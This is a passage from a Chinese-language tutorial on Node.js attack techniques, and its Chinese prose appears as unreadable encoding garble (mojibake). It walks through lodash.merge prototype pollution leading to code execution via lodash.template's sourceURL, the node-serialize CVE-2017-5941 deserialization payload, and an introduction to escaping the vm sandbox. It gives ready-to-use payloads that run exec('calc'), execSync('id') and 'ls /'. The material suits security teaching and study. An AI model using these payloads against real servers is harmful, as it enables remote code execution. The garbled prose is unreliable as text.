express.static('static')) app.use(session({ name: 'thejs.session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false })) app.engine('ejs', function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) app.set('views', './views') app.set('view engine', 'ejs') app.all('/', (req, res) =&gt; { // å®šä¹‰session let data = req.session.data || {language: [], category: []} if (req.method == 'POST') { // è·å–postæ•°æ®å¹¶åˆå¹¶ data = lodash.merge(data, req.body) req.session.data = data // å†å°†dataèµ‹å€¼ç»™session } res.render('index', { language: data.language, category: data.category }) }) app.listen(3000, () =&gt; console.log('Example app listening on port 3000!')) é—®é¢˜å‡ºåœ¨äº†lodashs.mergeå‡½æ•°è¿™é‡Œï¼Œè¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ä½†æ˜¯å…‰å­˜åœ¨æ¼æ´è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚ é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“ï¼Œè·Ÿè¸ªåˆ°lodash/template.jsä¸­ã€‚ å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚ var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + ' ' : ''; å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚ ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š var result = attempt(function() { return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues); }); é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚ æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š {\"__proto__\":{\"sourceURL\":\" global.process.mainModule.constructor._load('child_process').exec('calc')//\"}} (è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š {\"__proto__\":{\"sourceURL\":\" return e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')} //\"}} ä¸‹é¢è·Ÿç€ä½¬è¿‡ä¸€éCVEæ¼æ´ï¼Œæœ‰æ—¶é—´ä¸‹å»å¤ç°ã€‚ 5.3 node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941) æ¼æ´å‡ºç°åœ¨node-serializeæ¨¡å—0.0.4ç‰ˆæœ¬å½“ä¸­ï¼Œä½¿ç”¨npm install node-serialize@0.0.4å®‰è£…æ¨¡å—ã€‚ äº†è§£ä»€ä¹ˆæ˜¯IIFEï¼š IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚ IIFEä¸€èˆ¬å†™æˆä¸‹é¢çš„å½¢å¼ï¼š (function(){ /* code */ }()); // æˆ–è€… (function(){ /* code */ })(); node-serialize@0.0.4æ¼æ´ç‚¹ æ¼æ´ä»£ç ä½äºnode_modules ode-serialize\\lib\\serialize.jsä¸­ï¼š å…¶ä¸­çš„å…³é”®å°±æ˜¯ï¼šobj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');è¿™ä¸€è¡Œè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°ä¼ é€’ç»™evalçš„å‚æ•°æ˜¯ç”¨æ‹¬å·åŒ…è£¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ„é€ ä¸€ä¸ªfunction(){}()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä¸­IIFEç«‹å³è°ƒç”¨æ‰§è¡Œã€‚æ¥çœ‹å¦‚ä½•æ„é€ payloadï¼š æ„é€ Payload serialize = require('node-serialize'); var test = { rce : function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}, } console.log(\"åºåˆ—åŒ–ç”Ÿæˆçš„ Payload: \" + serialize.serialize(test)); ç”Ÿæˆçš„Payloadä¸ºï¼š {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}\"} å› ä¸ºéœ€è¦åœ¨ååºåˆ—åŒ–æ—¶è®©å…¶ç«‹å³è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„åºåˆ—åŒ–è¯­å¥çš„å‡½æ•°åé¢å†æ·»åŠ ä¸€ä¸ª()ï¼Œç»“æœå¦‚ä¸‹ï¼š {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}()\"} (è¿™é‡Œä¸èƒ½ç›´æ¥åœ¨å¯¹è±¡å†…å®šä¹‰IIFEè¡¨è¾¾å¼ï¼Œä¸ç„¶ä¼šåºåˆ—åŒ–å¤±è´¥) ä¼ é€’ç»™unserialize(æ³¨æ„è½¬ä¹‰å•å¼•å·)ï¼š var serialize = require('node-serialize'); var payload = '{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'ls /\\',function(error, stdout, stderr){console.log(stdout)});}()\"}'; serialize.unserialize(payload); æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œç»“æœå¦‚å›¾ï¼š 0x06 vmæ²™ç®±é€ƒé€¸ 6.1 æ²™ç®±é€ƒé€¸åˆè¯† è¯´åˆ°æ²™ç®±é€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µã€‚ JavaScriptå’ŒNodejsä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼šJavaScriptç”¨åœ¨æµè§ˆå™¨å‰ç«¯ï¼Œåæ¥å°†Chromeä¸­çš„v8å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸ºJavaScriptå•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤JavaScriptä¹Ÿå¯ä»¥ä½œä¸ºä¸€é—¨åç«¯è¯­è¨€ï¼Œå†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„JavaScriptå°±å«åšNodejsã€‚ ä»€ä¹ˆæ˜¯æ²™ç®±ï¼ˆsandboxï¼‰å½“æˆ‘ä»¬è¿è¡Œä¸€äº›å¯èƒ½ä¼šäº§ç”Ÿå±å®³çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ä¸»æœºçš„çœŸå®ç¯å¢ƒä¸Šè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å•ç‹¬å¼€è¾Ÿä¸€ä¸ªè¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œå®ƒä¸ä¸»æœºç›¸äº’éš”ç¦»ï¼Œä½†ä½¿ç”¨ä¸»æœºçš„ç¡¬ä»¶èµ„æºï¼Œæˆ‘ä»¬å°†æœ‰å±å®³çš„ä»£ç åœ¨æ²™ç®±ä¸­è¿è¡Œåªä¼šå¯¹æ²™ç®±å†…éƒ¨äº§ç”Ÿä¸€äº›å½±å“ï¼Œè€Œä¸ä¼šå½±å“åˆ°ä¸»æœºä¸Šçš„åŠŸèƒ½ï¼Œæ²™ç®±çš„å·¥ä½œæœºåˆ¶ä¸»è¦æ˜¯ä¾é é‡å®šå‘ï¼Œå°†æ¶æ„ä»£ç çš„æ‰§è¡Œç›®æ ‡é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨ã€‚ æ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandboxå’ŒVMä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Dockerå±äºsandboxçš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚åœ¨å®é™…é˜²æŠ¤æ—¶ï¼Œä½¿ç”¨Dockerå’ŒsandboxåµŒå¥—çš„æ–¹å¼æ›´å¤šä¸€ç‚¹ï¼Œå®‰å…¨æ€§ä¹Ÿæ›´é«˜ã€‚ åœ¨Nodejsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ªvmæ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤Nodeåç»­å‡çº§äº†vmï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„vm2æ²™ç®±ï¼Œvm2å¼•ç”¨äº†vmæ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚ 6.2 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç  æˆ‘ä»¬å…ˆæ¥çœ‹ä¸¤ä¸ªåœ¨nodeä¸­å°†æŠŠå­—ç¬¦ä¸²æ‰§è¡Œæˆä»£ç çš„æ–¹å¼ã€‚ æ–¹æ³•ä¸€ eval é¦–å…ˆæˆ‘åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªage.txt var age = 18 åˆ›å»ºä¸€ä¸ªy1.js const fs = require('fs') let content = fs.readFileSync('age.txt', 'utf-8') console.log(content) eval(content) console.log(age) å¯ä»¥å‘ç°æˆ‘ä»¬é€šè¿‡evalæ‰§è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§æ‰§è¡Œæ–¹å¼å¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸä¸‹å·²ç»æœ‰äº†åŒåçš„ageå˜é‡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šæŠ¥é”™ã€‚ åœ¨jsä¸­æ¯ä¸€ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ç”¨evalæ‰§è¡Œå­—ç¬¦ä¸²ä»£ç å¾ˆå®¹æ˜“å‡ºç°ä¸Šé¢çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å†çœ‹å¦å¤–ä¸€ç§æ–¹æ³•ã€‚ æ–¹æ³•äºŒï¼šnew Function ä¸Šé¢çš„æ–¹æ³•å› ä¸ºæ¨¡å—é—´çš„ä½œç”¨åŸŸè¢«é™åˆ¶äº†ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹å¦‚æœèƒ½å¤Ÿè‡ªå·±åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸæ˜¯ä¸æ˜¯å°±å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ‰§è¡Œä»£ç å‘¢ï¼Ÿnew Functionçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½¢å‚åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°å†…å’Œå‡½æ•°å¤–æ˜¯ä¸¤ä¸ªä½œç”¨åŸŸï¼Œä¸è¿‡å½“åœ¨å‡½æ•°ä¸­çš„ä½œç”¨åŸŸæƒ³è¦ä½¿ç”¨å‡½æ•°å¤–çš„å˜é‡æ—¶ï¼Œè¦é€šè¿‡å½¢å‚æ¥ä¼ é€’ï¼Œå½“å‚æ•°è¿‡å¤šæ—¶è¿™ç§æ–¹æ³•å°±å˜çš„éº»çƒ¦èµ·æ¥äº†ã€‚ ä»ä¸Šé¢ä¸¤ä¸ªæ‰§è¡Œä»£ç çš„ä¾‹å­å¯ä»¥çœ‹å‡ºæ¥å…¶å®æˆ‘ä»¬çš„æ€æƒ³å°±æ˜¯å¦‚ä½•åˆ›å»ºä¸€ä¸ªèƒ½å¤Ÿé€šè¿‡ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²å°±èƒ½æ‰§è¡Œä»£ç ï¼Œå¹¶ä¸”è¿˜ä¸å¤–éƒ¨éš”ç»çš„ä½œç”¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—çš„ä½œç”¨ã€‚ 6.3 Nodejsä½œç”¨åŸŸ è¯´åˆ°ä½œç”¨åŸŸï¼Œæˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹Nodejsä¸­çš„ä½œç”¨åŸŸæ˜¯æ€ä¹ˆåˆ†é…çš„ï¼ˆåœ¨Nodejsä¸­ä¸€èˆ¬æŠŠä½œç”¨åŸŸå«ä¸Šä¸‹æ–‡ï¼‰ã€‚ åœ¨Webç«¯ï¼ˆæµè§ˆå™¨ï¼‰ï¼Œå‘æŒ¥ä½œç”¨çš„ä¸€èˆ¬æ˜¯JavaScriptï¼Œå­¦è¿‡JavaScriptçš„å¸ˆå‚…åº”è¯¥éƒ½çŸ¥é“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨çš„çª—å£æ˜¯JavaScriptä¸­æœ€å¤§çš„å¯¹è±¡windowï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯å‘æŒ¥ä½œç”¨çš„Nodejså®ƒçš„æ„é€ å’ŒJavaScriptä¸å¤ªä¸€æ ·ã€‚ æˆ‘ä»¬åœ¨å†™ä¸€ä¸ªNodejsé¡¹ç›®æ—¶å¾€å¾€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œruquireå…¶ä»–çš„jsæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æˆ‘ä»¬éƒ½ç»™å®ƒä»¬å«åšâ€œåŒ…â€ã€‚æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼ŒåŒ…ä¹‹é—´çš„ä½œç”¨åŸŸæ˜¯äº’ç›¸éš”ç¦»ä¸äº’é€šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘åœ¨y1.jsä¸­requireäº†y2.jsï¼Œé‚£ä¹ˆæˆ‘åœ¨y1.jsä¸­ä¹Ÿæ— æ³•ç›´æ¥è°ƒç”¨y2.jsä¸­çš„å˜é‡å’Œå‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ã€‚ åœ¨åŒä¸€çº§ç›®å½•ä¸‹æœ‰y1.jså’Œy2.jsä¸¤ä¸ªæ–‡ä»¶ y1.js var age = 20 y2.js const a = require(\"./y1\") console.log(a.age) è¿è¡Œy2.jså‘ç°æŠ¥é”™ age å€¼ä¸ºundefined é‚£ä¹ˆæˆ‘ä»¬æƒ³y2ä¸­å¼•å…¥å¹¶ä½¿ç”¨y1ä¸­çš„å…ƒç´ åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŒNodejsç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå°†jsæ–‡ä»¶ä¸­å…ƒç´ è¾“å‡ºçš„æ¥å£exports ï¼ŒæŠŠy1ä¿®æ”¹æˆä¸‹é¢è¿™æ ·ï¼š y1.js var age = 20 exports.age = age æˆ‘ä»¬å†è¿è¡Œy2å°±å¯ä»¥æ‹¿åˆ°ageçš„å€¼äº† æˆ‘ä»¬ç”¨å›¾æ¥è§£é‡Šè¿™ä¸¤ä¸ªåŒ…ä¹‹é—´çš„å…³ç³»å°±æ˜¯ è¿™ä¸ªæ—¶å€™å°±æœ‰äººä¼šé—®å·¦ä¸Šè§’çš„globalæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œå°±è¦è¯´åˆ°Nodejsä¸­çš„å…¨å±€å¯¹è±¡äº†ã€‚ åˆšæ‰æˆ‘ä»¬æåˆ°åœ¨JavaScriptä¸­windowæ˜¯å…¨å±€å¯¹è±¡ï¼Œæµè§ˆå™¨å…¶ä»–æ‰€æœ‰çš„å±æ€§éƒ½æŒ‚è½½åœ¨windowä¸‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯çš„Nodejsä¸­å’Œwindowç±»ä¼¼çš„å…¨å±€å¯¹è±¡å«åšglobalï¼ŒNodejsä¸‹å…¶ä»–çš„æ‰€æœ‰å±æ€§å’ŒåŒ…éƒ½æŒ‚è½½åœ¨è¿™ä¸ªglobalå¯¹è±¡ä¸‹ã€‚åœ¨globalä¸‹æŒ‚è½½äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨è®¿é—®è¿™äº›å…¨å±€å˜é‡æ—¶ä¸éœ€è¦ç”¨global.xxxçš„æ–¹å¼æ¥è®¿é—®ï¼Œç›´æ¥ç”¨xxxå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œconsoleå°±æ˜¯æŒ‚è½½åœ¨globalä¸‹çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨ç”¨console.logè¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆglobal.console.logï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½†å…¨å±€å˜é‡åœ¨æ¯ä¸ªåŒ…ä¸­éƒ½æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥å°½é‡ä¸è¦å£°æ˜å…¨å±€å˜é‡ï¼Œä¸ç„¶å®¹æ˜“å¯¼è‡´å˜é‡æ±¡æŸ“ã€‚ç”¨ä¸Šé¢çš„ä»£ç ä¸¾ä¸ªä¾‹å­ï¼š y1.js global.age = 20 y2.js const a = require(\"./y1\") console.log(age) è¾“å‡ºï¼š å¯ä»¥å‘ç°æˆ‘è¿™æ¬¡åœ¨y1ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨exportså°†ageå¯¼å…¥ï¼Œå¹¶ä¸”y2åœ¨è¾“å‡ºæ—¶ä¹Ÿæ²¡æœ‰ç”¨a.ageï¼Œå› ä¸ºæ­¤æ—¶ageå·²ç»æŒ‚è½½åœ¨globalä¸Šäº†ï¼Œå®ƒçš„ä½œç”¨åŸŸå·²ç»ä¸åœ¨y1ä¸­äº†ã€‚ æˆ‘ä»¬è¾“å‡ºä¸€ä¸‹globalå¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°ageç¡®å®æŒ‚è½½åœ¨äº†globalä¸Šï¼š &lt;ref *1&gt; Object [global] { global: [Circular *1], clearInterval: [Function: clearInterval], clearTimeout: [Function: clearTimeout], setInterval: [Function: setInterval], setTimeout: [Function: setTimeout] { [Symbol(nodejs.util.promisify.custom)]: [Getter] }, queueMicrotask: [Function: queueMicrotask], performance: Performance { nodeTiming: PerformanceNodeTiming { name: 'node', entryType: 'node', startTime: 0, duration: 25.98190000653267, nodeStart: 0.4919999986886978, v8Start: 2.0012000054121017, bootstrapComplete: 18.864999994635582, environment: 10.277099996805191, loopStart: -1, loopExit: -1, idleTime: 0 }, timeOrigin: 1665558311872.296 }, clearImmediate: [Function: clearImmediate], setImmediate: [Function: setImmediate] { [Symbol(nodejs.util.promisify.custom)]: [Getter] }, age: 20 } 6.4 vmæ²™ç®±é€ƒé€¸ æˆ‘ä»¬åœ¨å‰é¢æåˆ°äº†ä½œç”¨åŸŸè¿™ä¸ªæ¦‚å¿µï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦å®ç°æ²™ç®±çš„éš”ç¦»ä½œç”¨ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œè®©ä»£ç åœ¨è¿™ä¸ªæ–°çš„ä½œç”¨åŸŸé‡Œé¢å»è¿è¡Œï¼Œè¿™æ ·å°±å’Œå…¶ä»–çš„ä½œç”¨åŸŸè¿›è¡Œäº†éš”ç¦»ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—è¿è¡Œçš„åŸç†ï¼Œå…ˆæ¥äº†è§£å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIã€‚ vm.runinThisContext(code)ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚ const vm = require('vm'); let localVar = 'initial value'; const vmResult = vm.runInThisContext('localVar = \"vm\";'); console.log('vmResult:', vmResult); console.log('localVar:', localVar); // vmResult: 'vm', localVar: 'initial value' vm.createContext([sandbox])ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚ vm.runInContext(code, contextifiedSandbox[, options])ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚ const util = require('util'); const vm = require('vm'); global.globalVar = 3; const sandbox = { globalVar: 1 }; vm.createContext(sandbox); vm.runInContext('globalVar *= 2;', sandbox); console.log(util.inspect(sandbox)); // { globalVar: 2 } console.log(util.inspect(globalVar)); // 3 vm.runInNewContext(code[, sandbox][, options]): creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚ vm.Scriptç±» vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚ new vm.Script(code, options)ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚ codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç  const util = require('util'); const vm = require('vm'); const sandbox = { animal: 'cat', count: 2 }; const script = new vm.Script('count += 1; name = \"kitty\";'); const context = vm.createContext(sandbox); script.runInContext(context); console.log(util.inspect(sandbox)); // { animal: 'cat', count: 3, name: 'kitty' } scriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚ æˆ‘ä»¬ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸æœ€åéƒ½æ˜¯è¿›è¡Œrceï¼Œé‚£ä¹ˆåœ¨Nodejsé‡Œè¦è¿›è¡Œrceå°±éœ€è¦proccesäº†ï¼Œåœ¨è·å–åˆ°processå¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨requireæ¥å¯¼å…¥child_processï¼Œå†åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚ä½†processæŒ‚è½½åœ¨globalä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨creatContextåæ˜¯ä¸èƒ½è®¿é—®åˆ°globalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°†globalä¸Šçš„processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚ å¦‚æœæˆ‘ä»¬æŠŠä»£ç æ”¹æˆè¿™æ ·ï¼ˆcodeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œï¼‰ï¼š \"use strict\"; const vm = require(\"vm\"); const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`); console.log(y1); vm.runInNewContext(`this.constructor.constructor('return process.env')()`); é‚£ä¹ˆæˆ‘ä»¬æ˜¯æ€ä¹ˆå®ç°é€ƒé€¸çš„å‘¢ï¼Œé¦–å…ˆè¿™é‡Œé¢çš„thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™runInNewContextçš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„()æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚ 